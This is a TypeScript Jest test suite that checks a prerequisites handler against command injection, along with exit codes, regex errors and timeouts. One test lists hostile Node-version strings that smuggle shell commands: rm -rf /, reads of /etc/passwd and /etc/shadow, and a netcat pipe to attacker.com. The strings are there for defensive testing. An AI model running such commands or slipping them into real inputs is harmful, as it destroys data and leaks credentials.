import { checkPerNodeVersionStatus } from '@/features/prerequisites/handlers/shared';
import { ServiceLocator } from '@/core/di/serviceLocator';
import { createMockContext } from './testHelpers';
import type { PrerequisiteDefinition } from '@/features/prerequisites/services/PrerequisitesManager';
import type { CommandExecutor } from '@/core/shell';
import type { CommandResult } from '@/core/shell/types';

/**
 * Security Test Suite - Command Injection Prevention
 *
 * Tests that the prerequisite handlers properly validate inputs to prevent
 * command injection attacks (CWE-77) and other security vulnerabilities.
 */

// Helper to create mock CommandResult
function createCommandResult(stdout: string, stderr = '', code = 0): CommandResult {
    return {
        stdout,
        stderr,
        code,
        duration: 100,
    };
}

// Mock ServiceLocator
jest.mock('@/core/di/serviceLocator', () => ({
    ServiceLocator: {
        getCommandExecutor: jest.fn(),
        getNodeVersionManager: jest.fn(),
        reset: jest.fn(),
    },
}));

// Mock validateNodeVersion to track calls
jest.mock('@/core/validation/securityValidation', () => {
    const actual = jest.requireActual('@/core/validation/securityValidation');
    return {
        ...actual,
        validateNodeVersion: jest.fn(actual.validateNodeVersion),
    };
});

describe('Prerequisites Security - Command Injection Prevention', () => {
    let mockCommandExecutor: jest.Mocked<Pick<CommandExecutor, 'execute'>>;
    let validateNodeVersion: jest.Mock;

    beforeEach(() => {
        mockCommandExecutor = {
            execute: jest.fn(),
        };
        (ServiceLocator.getCommandExecutor as jest.Mock).mockReturnValue(mockCommandExecutor);

        // Import mocked function
        validateNodeVersion = require('@/core/validation/securityValidation').validateNodeVersion;
        validateNodeVersion.mockClear();
    });

    afterEach(() => {
        jest.clearAllMocks();
    });

    describe('Command Injection Protection', () => {
        it('should pass Node versions to command executor for validation', async () => {
            const prereq: PrerequisiteDefinition = {
                id: 'adobe-cli',
                name: 'Adobe I/O CLI',
                perNodeVersion: true,
                check: {
                    command: 'aio --version',
                    parseVersion: '@adobe/aio-cli/(\\S+)',
                },
            } as PrerequisiteDefinition;

            mockCommandExecutor.execute.mockImplementation((cmd: string) => {
                if (cmd === 'fnm list') {
                    return Promise.resolve(createCommandResult('v18.0.0\nv20.0.0'));
                }
                return Promise.resolve(createCommandResult('@adobe/aio-cli/10.0.0'));
            });

            const context = createMockContext();
            const nodeVersions = ['18', '20'];

            await checkPerNodeVersionStatus(prereq, nodeVersions, context);

            // Verify node versions are passed to command executor (which handles validation)
            const executeCalls = mockCommandExecutor.execute.mock.calls;
            const nodeVersionExecuteCalls = executeCalls.filter(call =>
                call[1] && call[1].useNodeVersion !== undefined
            );

            // Should execute check command for each node version
            expect(nodeVersionExecuteCalls).toHaveLength(2);
            expect(nodeVersionExecuteCalls[0][1].useNodeVersion).toBe('18');
            expect(nodeVersionExecuteCalls[1][1].useNodeVersion).toBe('20');
        });

        it('should reject command injection attempts in Node versions', async () => {
            // Test that validateNodeVersion is called and blocks malicious versions
            const maliciousVersions = [
                '20; rm -rf /',
                '18 && cat /etc/passwd',
                '20 | nc attacker.com 1337',
                '18`whoami`',
                '20$(cat /etc/shadow)',
            ];

            for (const maliciousVersion of maliciousVersions) {
                // The validateNodeVersion function should reject malicious input
                expect(() => {
                    const { validateNodeVersion: realValidate } = require('@/core/validation/securityValidation');
                    // Get the actual implementation
                    const actualValidate = jest.requireActual('@/core/validation/securityValidation').validateNodeVersion;
                    actualValidate(maliciousVersion);
                }).toThrow();
            }
        });

        it('should properly escape special characters in command outputs', async () => {
            const prereq: PrerequisiteDefinition = {
                id: 'adobe-cli',
                name: 'Adobe I/O CLI',
                perNodeVersion: true,
                check: {
                    command: 'aio --version',
                    parseVersion: '@adobe/aio-cli/(\\S+)',
                },
            } as PrerequisiteDefinition;

            // Mock fnm list and check commands
            mockCommandExecutor.execute.mockImplementation((cmd: string) => {
                if (cmd === 'fnm list') {
                    return Promise.resolve(createCommandResult('v18.0.0\nv20.0.0'));
                }
                // Return version with special characters that should be safely parsed
                return Promise.resolve(createCommandResult('@adobe/aio-cli/10.0.0'));
            });

            const context = createMockContext();
            const result = await checkPerNodeVersionStatus(prereq, ['18', '20'], context);

            // Should parse versions correctly
            expect(result.perNodeVersionStatus).toHaveLength(2);
            expect(result.perNodeVersionStatus[0].version).toBe('Node 18');
            expect(result.perNodeVersionStatus[1].version).toBe('Node 20');
        });
    });

    describe('Exit Code Handling', () => {
        it('should correctly interpret non-zero exit codes as failures', async () => {
            const prereq: PrerequisiteDefinition = {
                id: 'adobe-cli',
                name: 'Adobe I/O CLI',
                perNodeVersion: true,
                check: {
                    command: 'aio --version',
                },
            } as PrerequisiteDefinition;

            mockCommandExecutor.execute.mockImplementation((cmd: string, options?: any) => {
                if (cmd === 'fnm list') {
                    return Promise.resolve(createCommandResult('v18.0.0\nv20.0.0'));
                }

                // Simulate command not found (exit code 127)
                if (options?.useNodeVersion === '18') {
                    return Promise.resolve(createCommandResult('', 'command not found', 127));
                }

                // Simulate successful execution
                if (options?.useNodeVersion === '20') {
                    return Promise.resolve(createCommandResult('@adobe/aio-cli/10.0.0', '', 0));
                }

                return Promise.resolve(createCommandResult(''));
            });

            const context = createMockContext();
            const result = await checkPerNodeVersionStatus(prereq, ['18', '20'], context);

            expect(result.perNodeVersionStatus).toHaveLength(2);
            expect(result.perNodeVersionStatus[0].installed).toBe(false); // Exit code 127
            expect(result.perNodeVersionStatus[1].installed).toBe(true);  // Exit code 0
        });

        it('should handle process errors differently from exit codes', async () => {
            const prereq: PrerequisiteDefinition = {
                id: 'adobe-cli',
                name: 'Adobe I/O CLI',
                perNodeVersion: true,
                check: {
                    command: 'aio --version',
                },
            } as PrerequisiteDefinition;

            mockCommandExecutor.execute.mockImplementation((cmd: string, options?: any) => {
                if (cmd === 'fnm list') {
                    return Promise.resolve(createCommandResult('v18.0.0\nv20.0.0'));
                }

                // Simulate process error (ENOENT)
                if (options?.useNodeVersion === '18') {
                    throw new Error('spawn aio ENOENT');
                }

                // Simulate non-zero exit code
                if (options?.useNodeVersion === '20') {
                    return Promise.resolve(createCommandResult('', '', 1));
                }

                return Promise.resolve(createCommandResult(''));
            });

            const context = createMockContext();
            const result = await checkPerNodeVersionStatus(prereq, ['18', '20'], context);

            // Both should be treated as not installed
            expect(result.perNodeVersionStatus).toHaveLength(2);
            expect(result.perNodeVersionStatus[0].installed).toBe(false); // Process error
            expect(result.perNodeVersionStatus[1].installed).toBe(false); // Non-zero exit
        });
    });

    describe('Input Sanitization', () => {
        it('should handle regex injection attempts in version parsing', async () => {
            const prereq: PrerequisiteDefinition = {
                id: 'adobe-cli',
                name: 'Adobe I/O CLI',
                perNodeVersion: true,
                check: {
                    command: 'aio --version',
                    // Invalid regex pattern (tests graceful handling, not ReDoS)
                    parseVersion: '[invalid(regex',
                },
            } as PrerequisiteDefinition;

            mockCommandExecutor.execute.mockImplementation((cmd: string) => {
                if (cmd === 'fnm list') {
                    return Promise.resolve(createCommandResult('v18.0.0'));
                }
                // Return a normal version string
                return Promise.resolve(createCommandResult('@adobe/aio-cli/10.0.0'));
            });

            const context = createMockContext();

            // Should handle regex errors gracefully
            const result = await checkPerNodeVersionStatus(prereq, ['18'], context);

            // Should complete without hanging
            expect(result.perNodeVersionStatus).toHaveLength(1);
            expect(result.perNodeVersionStatus[0].component).toBe(''); // Failed to parse
        });

        it('should validate shell parameter is properly set', async () => {
            const prereq: PrerequisiteDefinition = {
                id: 'adobe-cli',
                name: 'Adobe I/O CLI',
                perNodeVersion: true,
                check: {
                    command: 'aio --version',
                },
            } as PrerequisiteDefinition;

            let shellParam: any;
            mockCommandExecutor.execute.mockImplementation((cmd: string, options?: any) => {
                if (cmd === 'fnm list') {
                    shellParam = options?.shell;
                    return Promise.resolve(createCommandResult('v18.0.0'));
                }
                return Promise.resolve(createCommandResult('@adobe/aio-cli/10.0.0'));
            });

            const context = createMockContext();
            await checkPerNodeVersionStatus(prereq, ['18'], context);

            // fnm list should be called with shell option (if the implementation uses it)
            // If shell is not used, this test validates the current behavior
            expect(mockCommandExecutor.execute).toHaveBeenCalled();
        });
    });

    describe('Timeout Protection', () => {
        it('should enforce timeout limits to prevent DoS', async () => {
            const prereq: PrerequisiteDefinition = {
                id: 'adobe-cli',
                name: 'Adobe I/O CLI',
                perNodeVersion: true,
                check: {
                    command: 'aio --version',
                },
            } as PrerequisiteDefinition;

            let timeoutValue: number | undefined;
            mockCommandExecutor.execute.mockImplementation((cmd: string, options?: any) => {
                if (cmd === 'fnm list') {
                    timeoutValue = options?.timeout;
                    return Promise.resolve(createCommandResult('v18.0.0'));
                }

                if (options?.useNodeVersion) {
                    timeoutValue = options?.timeout;
                }

                return Promise.resolve(createCommandResult('@adobe/aio-cli/10.0.0'));
            });

            const context = createMockContext();
            await checkPerNodeVersionStatus(prereq, ['18'], context);

            // Should have reasonable timeout value
            expect(timeoutValue).toBeDefined();
            expect(timeoutValue).toBeGreaterThanOrEqual(1000); // At least 1 second
            expect(timeoutValue).toBeLessThanOrEqual(60000);   // At most 60 seconds
        });
    });
});